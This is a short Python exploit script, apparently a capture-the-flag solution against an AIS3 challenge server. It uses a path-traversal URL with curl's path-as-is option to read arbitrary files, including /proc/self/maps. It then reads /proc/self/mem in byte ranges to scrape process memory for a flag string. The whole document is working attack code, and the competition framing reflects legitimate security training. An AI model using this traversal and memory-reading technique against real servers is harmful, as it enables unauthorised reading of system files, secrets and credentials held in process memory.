import pycurl
from io import BytesIO


def read_file(path, range=None):
    buffer = BytesIO()
    c = pycurl.Curl()
    c.setopt(c.URL, f"http://chals1.ais3.org:25519/../../../../../../../..{path}")
    c.setopt(c.CUSTOMREQUEST, "media")
    if range:
        c.setopt(c.HTTPHEADER, [f"Range: bytes={range[0]}-{range[1]}"])
    c.setopt(c.WRITEDATA, buffer)
    c.setopt(c.PATH_AS_IS, 1)
    c.setopt(c.IGNORE_CONTENT_LENGTH, 1)
    c.perform()
    c.close()
    return buffer.getvalue()


def parse_maps(maps: str):
    ar = []
    for line in maps.strip("\0\r\n ").splitlines():
        mem, perm, *_, name = line.split(" ")
        start, end = [int(x, 16) for x in mem.split("-")]
        name = name.strip() if name.strip() else None
        ar.append((start, end, perm, name))
    return ar


def read_mem_raw(start, end):
    return read_file("/proc/self/mem", (start, end - 1))


def read_mem(start, end, bs=1024 * 256):
    if (end - start) // bs > 20:
        # too big, ignore
        return b""
    ret = b""
    for i in range(start, end, bs):
        s = i
        e = min(i + bs, end)
        ret += read_mem_raw(s, e)
    return ret


maps = read_file("/proc/self/maps").decode()
maps = parse_maps(maps)

target = b"/flag_"
for start, end, perm, name in maps:
    data = read_mem(start, end)
    if target in data:
        print(hex(start), hex(end), hex(end - start), perm, name)
        i = 0
        while True:
            try:
                i = data.index(target, i)
                print(data[i : i + 64])
                i += 1
            except ValueError:
                break
